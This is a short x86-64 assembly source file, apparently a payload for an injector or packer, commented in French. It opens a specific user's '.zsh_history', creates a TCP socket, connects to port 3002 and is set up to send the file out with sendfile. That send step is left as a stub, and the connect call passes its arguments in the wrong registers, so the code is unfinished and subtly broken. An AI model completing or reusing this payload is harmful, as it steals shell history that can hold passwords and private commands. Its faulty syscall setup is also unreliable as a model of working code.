[BITS 64]

global _payload
global _payload_size

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

section .data
    path db '/home/maxence/.zsh_history', 0
    stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
    sockaddr_in:
        ; La structure sockaddr_in est composée de :
        ; - sin_family: 2 octets
        ; - sin_port: 2 octets
        ; - sin_addr: 4 octets
        ; - sin_zero: 8 octets
        ; Taille totale: 16 octets
        ; Nous définissons la structure en mémoire ici.
        ; db 16                      ; sin_len
        db 2                       ; sin_family (AF_INET)
        dw 0xba0b                  ; sin_port (3002 en hex)
        dd 0                       ; sin_addr (INADDR_ANY)
        times 8 db 0               ; sin_zero (8 octets de zéros)

section .text
global _payload

_payload:
    push rbp
    mov rbp, rsp

    ; Ouvrir le fichier
    mov rax, 2 ; SYS_open
    lea rdi, [path]
    mov rsi, 0 ; O_RDONLY
    syscall
    test rax, rax
    js error_open

    mov r12, rax ; Descripteur de fichier

    ; Récupérer les métadonnées du fichier
    mov rax, 4 ; SYS_stat
    lea rdi, [path]
    lea rsi, [stat_buffer]
    syscall
    test rax, rax
    js error_stat

    ; Créer la socket
    mov rax, 41 ; SYS_socket
    mov rdi, 2 ; AF_INET
    mov rsi, 1 ; SOCK_STREAM
    mov rdx, 0
    syscall
    test rax, rax
    js error_socket

    mov r13, rax ; Descripteur de socket

    ; Connecter au serveur
    mov rax, 42 ; SYS_connect
    lea rdi, [sockaddr_in]
    mov rsi, r13
    mov rdx, 16 ; Taille de sockaddr_in
    syscall
    test rax, rax
    js error_connect

    ; Envoyer le fichier (simplification, voir plus bas)
    mov rax, 40 ; SYS_sendfile
    ; ...

    ; Fermer le fichier et la socket
    mov rax, 3 ; SYS_close
    mov rdi, r12
    syscall
    mov rax, 3 ; SYS_close
    mov rdi, r13
    syscall

    leave
    ret

error_open:
    ; Gestion de l'erreur
    ; ...
    jmp exit

error_stat:
    ; Gestion de l'erreur
    ; ...
    jmp exit

error_socket:
    ; Gestion de l'erreur
    ; ...
    jmp exit

error_connect:
    ; Gestion de l'erreur
    ; ...
    jmp exit

exit:
    ; Quitter le programme
    ; mov rax, 60
    ; xor rdi, rdi
    ; syscall
	leave
    ret
